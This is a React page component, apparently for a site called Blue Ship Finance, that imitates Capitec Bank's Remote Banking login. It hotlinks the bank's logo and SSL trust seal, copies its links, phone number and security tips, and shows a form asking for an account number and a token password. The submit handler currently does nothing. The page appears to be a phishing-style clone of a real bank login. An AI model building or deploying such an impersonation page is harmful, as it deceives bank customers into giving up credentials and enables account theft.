import React from "react";
import { Meta } from "../../../components";
import { Box, Stack } from "@mui/material";

const inputStyles = {
  color: "#383633",
  fontFamily: "Flama-Basic",
  fontSize: "15px",
  height: "25px",
  padding: "0px 0px 0px 10px",
  border: "1px solid #383633",
  background: "#fff",
};

const Capitec = () => {
  return (
    <>
      <Meta
        title="Internet Banking - Capitec Tokenization - Blue Ship Finance"
        description="Internet Banking - Capitec Tokenization - Blue Ship Finance"
      />
      <main
        style={{
          background: "#f8f8ff",
          color: "#526065",
          fontFamily: "'Flama-Basic' !important",
          minHeight: "100vh",
        }}
      >
        <Box
          sx={{
            display: "flex",
            padding: "1rem",
            flexDirection: { xs: "column", sm: "row" },
            alignItems: { xs: "space-between", sm: "center" },
            justifyContent: { xs: "center", sm: "space-between" },
            pr: { xs: 0, sm: 0, md: "300px" },
          }}
        >
          <div className="logo">
            <a
              href="https://www.capitecbank.co.za/"
              className="banking"
              target="_blank"
              rel="noreferrer"
            >
              <img
                src="https://direct.capitecbank.co.za/ibank/capitec/images/logos/logo_main.png"
                alt="Capitec Bank Logo"
                style={{ width: "200px" }}
              />
            </a>
          </div>

          <Stack
            component="ul"
            direction="row"
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "flex-end",
              gap: "1rem",
              fontSize: "15px",
            }}
          >
            <li className="hidden-xs">
              <div className="linkWrap ">
                <a
                  href="https://www.capitecbank.co.za/"
                  className="banking"
                  target="_blank"
                  rel="noreferrer"
                >
                  Capitec Bank
                </a>
              </div>
            </li>
            <li>
              <div className="linkWrap">
                <a
                  href="https://www.capitecbank.co.za/privacy-and-security"
                  target="_blank"
                  rel="noreferrer"
                >
                  Security
                </a>
              </div>
            </li>
            <li>
              <div className="linkWrap">
                <a
                  href="https://www.capitecbank.co.za/privacy-centre/"
                  target="_blank"
                  rel="noreferrer"
                >
                  Privacy Centre
                </a>
              </div>
            </li>
            <li className="phoneHeader">
              <span href="tel:0860 10 20 43">
                <div id="mobileNumber" className=" ">
                  0860 10 20 43
                </div>
              </span>
            </li>
          </Stack>
        </Box>

        <Box p={2} maxWidth="1024px" mx="auto">
          <h1
            style={{
              padding: "0px 0px 10px 0px",

              fontSize: "55px",
              fontWeight: "normal",
              lineHeight: "55px",
              color: "#009de0",
              textTransform: "lowercase",
            }}
          >
            Remote Banking
          </h1>

          <Box
            sx={{
              display: "grid",
              gridTemplateColumns: { xs: "1", sm: "1", md: "repeat(2, 1fr)" },
            }}
          >
            <Stack
              direction="row"
              // alignItems="center"
              justifyContent="space-between"
            >
              <form>
                <label id="usernameLabel" htmlFor="username">
                  <span class="account-number">Account number/username:</span>
                  <br />
                  <input
                    id="username"
                    name="username"
                    type="text"
                    value={""}
                    maxlength="40"
                    style={inputStyles}
                  />
                </label>
                <label id="tokenPasswordLabel" htmlFor="tokenPassword">
                  <span class="account-number">Token Password:</span>
                  <br />
                  <input
                    id="tokenPassword"
                    name="tokenPassword"
                    type="text"
                    value={""}
                    maxlength="40"
                    style={inputStyles}
                  />
                </label>
                <button
                  type="submit"
                  className="capitec-button"
                  onClick={(e) => {
                    e.preventDefault();
                  }}
                >
                  Submit
                </button>
              </form>
              <a
                href="https://www.entrust.net/customer/profile.cfm?domain=direct.capitecbank.co.za"
                target="_blank"
                rel="noreferrer"
              >
                <img
                  src="https://direct.capitecbank.co.za/ibank/images/entrust/SSL-certificate-seal-ssl-animated.gif"
                  border="0"
                  alt="SSL, SSL Certificates, Secure Sockets Layer"
                  style={{ width: "100px" }}
                />
              </a>
            </Stack>

            <div
              style={{
                background: "#fff",
                border: "1px solid #e3e3e3",
                borderRadius: "4px 4px 16px 4px",
                padding: "20px",
                margin: "20px 0",
                fontSize: "15px",
              }}
            >
              <h2>Security Basics</h2>
              <ol>
                <li>
                  We will NEVER ask you for your Remote PIN, password
                  <br />
                  or token passwords by email, SMS or telephone
                </li>
                <li>
                  NEVER use a link or an attachment in any message to access
                  Remote Banking
                </li>
                <li>
                  Check your accounts often and report any suspicious activity
                  immediately on <span>0860 10 20 43</span>
                </li>
              </ol>
            </div>
          </Box>
        </Box>
      </main>
    </>
  );
};

export default Capitec;
